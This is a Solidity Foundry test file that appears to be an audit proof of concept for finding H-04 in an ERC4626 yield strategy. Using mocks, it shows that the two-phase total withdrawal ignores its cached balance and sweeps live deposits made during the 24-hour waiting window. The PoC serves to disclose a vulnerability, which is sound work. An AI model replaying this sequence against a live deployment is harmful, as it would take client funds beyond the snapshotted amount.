// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol";
import "../src/mocks/MockERC20.sol";
import "./mocks/MockERC4626Vault.sol";
import "./mocks/MockAMMAdapter.sol";

/**
 * @title PoC_M03_TwoPhaseCacheDesync
 * @notice Proof of Concept for finding H-04
 *
 * @dev Vulnerability Locations:
 *      - src/AYieldStrategy.sol:379-417 (_initiateWithdrawal / _executeWithdrawal)
 *      - src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol:368-399 (_totalWithdraw)
 *
 * VULNERABILITY SUMMARY:
 *   The two-phase total withdrawal flow caches principal in `state.balance` at Phase 1,
 *   then passes that cached value as `amount` to `_totalWithdraw()` at Phase 2. However,
 *   the child `ERC4626MarketYieldStrategy._totalWithdraw` IGNORES the `amount` parameter
 *   and reads `clientBalances[token][client]` LIVE (line 378). This means any deposits
 *   made by the client during the 24h waiting window get silently swept along by the
 *   Phase 2 execution -- the cache is meaningless.
 *
 * ATTACK / DESYNC PATH:
 *   1. Client deposits 1000 -> principal = 1000
 *   2. Owner calls totalWithdrawal() Phase 1 -> caches state.balance = 1000
 *   3. During 24h waiting period, client deposits another 1000
 *      -> live clientBalances[token][client] = 2000, but cache still says 1000
 *   4. After 24h, owner calls totalWithdrawal() Phase 2
 *   5. _totalWithdraw discards the cached `amount=1000` and uses the LIVE 2000
 *   6. The full 2000 is swept to owner, not the 1000 that was snapshotted
 */
contract PoC_M03_TwoPhaseCacheDesync is Test {
    ERC4626MarketYieldStrategy strategy;
    MockERC20 underlyingToken;
    MockERC4626Vault erc4626Vault;
    MockAMMAdapter ammAdapter;

    address owner = address(0x1234);
    address client = address(0x5678);
    address user1 = address(0xDEF0);

    uint256 constant INITIAL_TOKEN_SUPPLY = 10_000_000e18;

    function setUp() public {
        // Deploy mock tokens
        underlyingToken = new MockERC20("Underlying", "UNDERLYING", 18);

        // Deploy mock ERC4626 vault
        erc4626Vault = new MockERC4626Vault("Vault Shares", "vUNDERLYING", address(underlyingToken));

        // Deploy mock AMM adapter
        ammAdapter = new MockAMMAdapter();

        // Deploy strategy
        vm.prank(owner);
        strategy =
            new ERC4626MarketYieldStrategy(owner, address(underlyingToken), address(erc4626Vault), address(ammAdapter));

        // Set 1:1 exchange rates for underlying <-> vault tokens
        ammAdapter.setExchangeRate(address(underlyingToken), address(erc4626Vault), 1e18);
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 1e18);

        // Mint tokens
        underlyingToken.mint(client, INITIAL_TOKEN_SUPPLY);

        // Fund AMM adapter with vault shares (for deposit swaps)
        underlyingToken.mint(address(this), INITIAL_TOKEN_SUPPLY);
        underlyingToken.approve(address(erc4626Vault), INITIAL_TOKEN_SUPPLY);
        erc4626Vault.deposit(INITIAL_TOKEN_SUPPLY, address(ammAdapter));

        // Fund AMM adapter with underlying tokens (for withdrawal swaps)
        underlyingToken.mint(address(ammAdapter), INITIAL_TOKEN_SUPPLY);

        // Authorize client and configure slippage
        vm.startPrank(owner);
        strategy.setClient(client, true);
        strategy.setSlippageTolerance(100); // 1% slippage
        vm.stopPrank();

        // Approve strategy to spend client's tokens
        vm.prank(client);
        underlyingToken.approve(address(strategy), type(uint256).max);
    }

    /**
     * @notice Demonstrates that a deposit made during the 24h Phase 1 waiting window
     *         gets silently swept by the Phase 2 totalWithdrawal execution.
     */
    function test_DepositDuringWindowGetsSweptByPhase2() public {
        // ============ STEP 1: Initial deposit of 1000 ============
        uint256 firstDeposit = 1000e18;

        vm.prank(client);
        strategy.deposit(address(underlyingToken), firstDeposit, user1);

        assertEq(
            strategy.principalOf(address(underlyingToken), user1),
            firstDeposit,
            "user1 principal should equal first deposit"
        );

        console.log("=== Step 1: Client deposited 1000 underlying ===");
        console.log("Live principal of user1:", strategy.principalOf(address(underlyingToken), user1));

        // ============ STEP 2: Phase 1 -- caches state.balance = 1000 ============
        vm.prank(owner);
        strategy.totalWithdrawal(address(underlyingToken), user1);

        // Inspect cached snapshot
        (uint256 initiatedAt, AYieldStrategy.WithdrawalStatus statusEnum, uint256 cachedBalance) =
            strategy.withdrawalStates(address(underlyingToken), user1);

        assertEq(cachedBalance, firstDeposit, "Phase 1 should cache balance = 1000");
        assertEq(uint256(statusEnum), uint256(AYieldStrategy.WithdrawalStatus.Initiated), "Phase 1 sets Initiated");

        console.log("");
        console.log("=== Step 2: Owner triggered totalWithdrawal Phase 1 ===");
        console.log("Cached state.balance (snapshot):", cachedBalance);
        console.log("initiatedAt:", initiatedAt);

        // ============ STEP 3: Time advances but stays inside waiting period ============
        vm.warp(block.timestamp + 12 hours);
        console.log("");
        console.log("=== Step 3: Warped 12h into the 24h waiting period ===");

        // ============ STEP 4: Client deposits another 1000 during waiting window ============
        uint256 secondDeposit = 1000e18;

        vm.prank(client);
        strategy.deposit(address(underlyingToken), secondDeposit, user1);

        uint256 livePrincipalAfterSecondDeposit = strategy.principalOf(address(underlyingToken), user1);
        assertEq(livePrincipalAfterSecondDeposit, firstDeposit + secondDeposit, "Live principal should now be 2000");

        // Snapshot is unchanged -- still 1000
        (, , uint256 cachedBalanceAfterSecondDeposit) = strategy.withdrawalStates(address(underlyingToken), user1);
        assertEq(cachedBalanceAfterSecondDeposit, firstDeposit, "Cache STILL equals 1000 after second deposit");

        console.log("");
        console.log("=== Step 4: Client deposited another 1000 ===");
        console.log("Live principal of user1 NOW:", livePrincipalAfterSecondDeposit);
        console.log("Cached state.balance is STILL:", cachedBalanceAfterSecondDeposit);
        console.log("DESYNC: live (2000) != cached (1000)");

        // ============ STEP 5: Warp past the 24h waiting period (into execution window) ============
        // Phase 1 was at time T0; we are at T0 + 12h. WAITING_PERIOD = 24h.
        // Warp another 13h to land at T0 + 25h, well within 24h..72h execution window.
        vm.warp(block.timestamp + 13 hours);

        console.log("");
        console.log("=== Step 5: Warped past the 24h waiting period; now in execution window ===");

        // ============ STEP 6: Phase 2 -- the bug ============
        uint256 ownerBalanceBefore = underlyingToken.balanceOf(owner);

        vm.prank(owner);
        strategy.totalWithdrawal(address(underlyingToken), user1);

        uint256 ownerBalanceAfter = underlyingToken.balanceOf(owner);
        uint256 receivedByOwner = ownerBalanceAfter - ownerBalanceBefore;

        console.log("");
        console.log("=== Step 6: Owner triggered Phase 2 ===");
        console.log("Owner received underlying:", receivedByOwner);
        console.log("Cached snapshot was:       ", firstDeposit);
        console.log("Live principal was:        ", firstDeposit + secondDeposit);

        // ============ ASSERTIONS: the bug is proven ============

        // Live clientBalances was used, not the cached snapshot.
        // user1 principal should now be ZERO (child zeros it out)
        assertEq(
            strategy.principalOf(address(underlyingToken), user1),
            0,
            "user1 principal must be zeroed by _totalWithdraw"
        );

        // The owner received the FULL live balance (2000), NOT the cached 1000.
        // With 1% slippage, allow a small tolerance, but it's clearly closer to 2000 than 1000.
        assertGt(receivedByOwner, firstDeposit + (secondDeposit / 2),
            "Owner received much more than the cached 1000 -- live state was used");
        assertApproxEqRel(
            receivedByOwner,
            firstDeposit + secondDeposit,
            0.02e18, // 2% tolerance for slippage / rounding
            "Owner received roughly 2000, proving live state, not cached snapshot, was used"
        );

        // Critical assertion: the amount actually swept does NOT match the cached snapshot.
        // If the bug were fixed, receivedByOwner would be ~1000 (the cached value), not ~2000.
        assertTrue(
            receivedByOwner > firstDeposit,
            "BUG CONFIRMED: Phase 2 swept more than the Phase 1 snapshot"
        );

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Phase 1 snapshot (state.balance):", firstDeposit);
        console.log("Phase 2 actually swept:          ", receivedByOwner);
        console.log("The cached `amount` argument is silently ignored by the child.");
    }

    /**
     * @notice Symmetric demonstration: cached balance is also ignored when client
     *         WITHDRAWS during the window. Phase 2 sweeps the (smaller) live balance.
     *         This isolates the desync from any specific deposit-side scenario.
     */
    function test_CachedBalanceIsIgnoredByChild() public {
        // Initial deposit of 2000
        uint256 initialDeposit = 2000e18;

        vm.prank(client);
        strategy.deposit(address(underlyingToken), initialDeposit, user1);

        // Phase 1 -- cache 2000
        vm.prank(owner);
        strategy.totalWithdrawal(address(underlyingToken), user1);

        (, , uint256 cachedBalance) = strategy.withdrawalStates(address(underlyingToken), user1);
        assertEq(cachedBalance, initialDeposit, "Cache = 2000 after Phase 1");

        // Authorize a second client (user1 itself can't withdraw -- only authorized clients)
        // Use the existing `client` to withdraw on behalf of user1's principal? No --
        // withdraw() debits the recipient parameter. Use withdrawAsOwner instead.
        // The owner can withdraw from user1's principal during the window.

        // During the waiting window, owner withdraws 1500 from user1
        vm.warp(block.timestamp + 6 hours);

        vm.prank(owner);
        strategy.withdrawAsOwner(user1, owner, 1500e18);

        // Live principal is now 500, but cache still says 2000
        uint256 liveAfter = strategy.principalOf(address(underlyingToken), user1);
        assertEq(liveAfter, 500e18, "Live principal = 500 after owner withdraws 1500");

        (, , uint256 cachedAfter) = strategy.withdrawalStates(address(underlyingToken), user1);
        assertEq(cachedAfter, initialDeposit, "Cache STILL = 2000 (snapshot is stale)");

        // Warp past 24h waiting period
        vm.warp(block.timestamp + 19 hours);

        // Phase 2 -- should sweep the LIVE 500, not the cached 2000
        uint256 ownerBalBefore = underlyingToken.balanceOf(owner);

        vm.prank(owner);
        strategy.totalWithdrawal(address(underlyingToken), user1);

        uint256 ownerBalAfter = underlyingToken.balanceOf(owner);
        uint256 sweptInPhase2 = ownerBalAfter - ownerBalBefore;

        console.log("=== test_CachedBalanceIsIgnoredByChild ===");
        console.log("Cached snapshot at Phase 1:", cachedBalance);
        console.log("Live principal at Phase 2:  500e18");
        console.log("Phase 2 actually swept:    ", sweptInPhase2);

        // The amount swept should be ~500, NOT the cached 2000.
        assertApproxEqRel(
            sweptInPhase2,
            500e18,
            0.02e18,
            "Phase 2 should sweep the LIVE 500, proving the cached `amount` is ignored"
        );

        // Strict bound: must be much less than the cached snapshot
        assertLt(
            sweptInPhase2,
            initialDeposit / 2,
            "Phase 2 swept less than half the cached snapshot -- cache is unused"
        );

        // user1 fully zeroed
        assertEq(
            strategy.principalOf(address(underlyingToken), user1),
            0,
            "user1 principal zeroed by _totalWithdraw"
        );

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED (symmetric direction) ===");
        console.log("Cached `amount` parameter is completely unused by _totalWithdraw.");
    }
}
